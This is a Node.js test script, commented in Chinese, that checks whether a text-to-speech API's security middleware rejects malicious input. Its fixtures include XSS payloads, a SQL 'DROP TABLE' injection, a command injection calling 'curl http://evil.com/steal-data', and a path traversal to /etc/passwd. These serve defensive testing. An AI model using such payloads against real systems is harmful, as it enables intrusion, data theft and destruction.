/**
 * 安全中间件测试脚本
 * 测试XSS防护、恶意字符检测、输入验证等安全功能
 */

require('dotenv').config();
const axios = require('axios');

const BASE_URL = 'http://localhost:3000';
const TEST_API_KEY = process.env.API_KEYS ? process.env.API_KEYS.split(',')[0] : 'test-key';

// 测试用例定义
const securityTests = [
  {
    name: '正常文本输入',
    shouldPass: true,
    data: {
      service: 'aliyun_cosyvoice',
      text: 'Hello world, 这是一个正常的测试文本。',
      voice: 'default'
    }
  },
  {
    name: 'XSS攻击 - script标签',
    shouldPass: false,
    data: {
      service: 'aliyun_cosyvoice',
      text: '<script>alert("xss")</script>Hello',
      voice: 'default'
    }
  },
  {
    name: 'XSS攻击 - JavaScript协议',
    shouldPass: false,
    data: {
      service: 'aliyun_cosyvoice',
      text: 'javascript:alert("xss")Hello',
      voice: 'default'
    }
  },
  {
    name: 'XSS攻击 - iframe标签',
    shouldPass: false,
    data: {
      service: 'aliyun_cosyvoice',
      text: '<iframe src="javascript:alert(\'xss\')"></iframe>Hello',
      voice: 'default'
    }
  },
  {
    name: 'SQL注入尝试',
    shouldPass: false,
    data: {
      service: 'aliyun_cosyvoice',
      text: "Hello'; DROP TABLE users; --",
      voice: 'default'
    }
  },
  {
    name: '命令注入尝试',
    shouldPass: false,
    data: {
      service: 'aliyun_cosyvoice',
      text: 'Hello; curl http://evil.com/steal-data',
      voice: 'default'
    }
  },
  {
    name: '路径遍历攻击',
    shouldPass: false,
    data: {
      service: 'aliyun_cosyvoice',
      text: 'Hello ../../etc/passwd',
      voice: 'default'
    }
  },
  {
    name: '超长文本攻击',
    shouldPass: false,
    data: {
      service: 'aliyun_cosyvoice',
      text: 'A'.repeat(6000), // 超过5000字符限制
      voice: 'default'
    }
  },
  {
    name: '控制字符攻击',
    shouldPass: false,
    data: {
      service: 'aliyun_cosyvoice',
      text: 'Hello\x00\x01\x02World',
      voice: 'default'
    }
  },
  {
    name: 'Unicode控制字符',
    shouldPass: false,
    data: {
      service: 'aliyun_cosyvoice',
      text: 'Hello\u202E\u200EWorld', // RTL覆盖字符
      voice: 'default'
    }
  },
  {
    name: '空文本输入',
    shouldPass: false,
    data: {
      service: 'aliyun_cosyvoice',
      text: '',
      voice: 'default'
    }
  },
  {
    name: '缺少text字段',
    shouldPass: false,
    data: {
      service: 'aliyun_cosyvoice',
      voice: 'default'
    }
  },
  {
    name: '无效的speed参数',
    shouldPass: false,
    data: {
      service: 'aliyun_cosyvoice',
      text: 'Hello',
      voice: 'default',
      speed: 10.0 // 超出0.25-4.0范围
    }
  },
  {
    name: '无效的pitch参数',
    shouldPass: false,
    data: {
      service: 'aliyun_cosyvoice',
      text: 'Hello',
      voice: 'default',
      pitch: 5.0 // 超出0.5-2.0范围
    }
  },
  {
    name: '批量正常输入',
    shouldPass: true,
    data: {
      service: 'aliyun_cosyvoice',
      texts: ['Hello', 'World', '测试'],
      voice: 'default'
    }
  },
  {
    name: '批量攻击向量',
    shouldPass: false,
    data: {
      service: 'aliyun_cosyvoice',
      texts: ['Hello', '<script>alert("xss")</script>', 'World'],
      voice: 'default'
    }
  },
  {
    name: '批量超长文本',
    shouldPass: false,
    data: {
      service: 'aliyun_cosyvoice',
      texts: ['Hello', 'A'.repeat(2000), 'World'], // 单个文本超过1000字符
      voice: 'default'
    }
  },
  {
    name: '批量数量过多',
    shouldPass: false,
    data: {
      service: 'aliyun_cosyvoice',
      texts: Array(101).fill('Hello'), // 超过100个文本限制
      voice: 'default'
    }
  }
];

async function runSecurityTest() {
  console.log('🔒 开始安全中间件测试...\n');

  let passedTests = 0;
  let failedTests = 0;

  for (let i = 0; i < securityTests.length; i++) {
    const test = securityTests[i];
    console.log(`📍 测试 ${i + 1}/${securityTests.length}: ${test.name}`);

    try {
      const response = await axios.post(`${BASE_URL}/api/tts/synthesize`, test.data, {
        headers: {
          'Content-Type': 'application/json',
          'X-API-Key': TEST_API_KEY
        },
        timeout: 5000
      });

      if (test.shouldPass) {
        console.log('✅ 通过 - 正常请求被接受');
        passedTests++;
      } else {
        console.log('❌ 失败 - 应该被拒绝的攻击请求被接受了');
        failedTests++;
      }

    } catch (error) {
      if (error.response) {
        if (test.shouldPass) {
          console.log(`❌ 失败 - 正常请求被错误拒绝 (${error.response.status})`);
          console.log(`   错误信息: ${error.response.data?.error || error.response.data?.message}`);
          failedTests++;
        } else {
          console.log('✅ 通过 - 攻击请求被正确拒绝');
          if (error.response.data?.details && Array.isArray(error.response.data.details)) {
            console.log(`   拒绝原因: ${error.response.data.details.join(', ')}`);
          } else if (error.response.data?.error) {
            console.log(`   拒绝原因: ${error.response.data.error}`);
          }
          passedTests++;
        }
      } else {
        console.log(`⚠️  网络错误: ${error.message}`);
        failedTests++;
      }
    }
    console.log('');
  }

  // 测试请求体大小限制
  console.log('📍 测试请求体大小限制...');
  try {
    const largeData = {
      service: 'aliyun_cosyvoice',
      text: 'A'.repeat(600 * 1024), // 约600KB，超过512KB限制
      voice: 'default'
    };

    await axios.post(`${BASE_URL}/api/tts/synthesize`, largeData, {
      headers: {
        'Content-Type': 'application/json',
        'X-API-Key': TEST_API_KEY
      },
      timeout: 5000
    });

    console.log('❌ 失败 - 超大请求体被接受了');
    failedTests++;
  } catch (error) {
    if (error.response && error.response.status === 413) {
      console.log('✅ 通过 - 超大请求体被正确拒绝');
      passedTests++;
    } else {
      console.log(`⚠️  意外错误: ${error.message}`);
      failedTests++;
    }
  }

  console.log('\n🎯 测试总结:');
  console.log(`✅ 通过: ${passedTests}`);
  console.log(`❌ 失败: ${failedTests}`);
  console.log(`📊 总计: ${securityTests.length + 1} 个测试`);

  const successRate = (passedTests / (securityTests.length + 1)) * 100;
  console.log(`🎯 成功率: ${successRate.toFixed(1)}%`);

  if (successRate >= 90) {
    console.log('🎉 安全测试整体通过！系统防护良好。');
  } else if (successRate >= 70) {
    console.log('⚠️  安全测试部分通过，建议进一步改进。');
  } else {
    console.log('🚨 安全测试失败，存在严重安全风险！');
  }
}

// 运行测试
runSecurityTest().catch(console.error);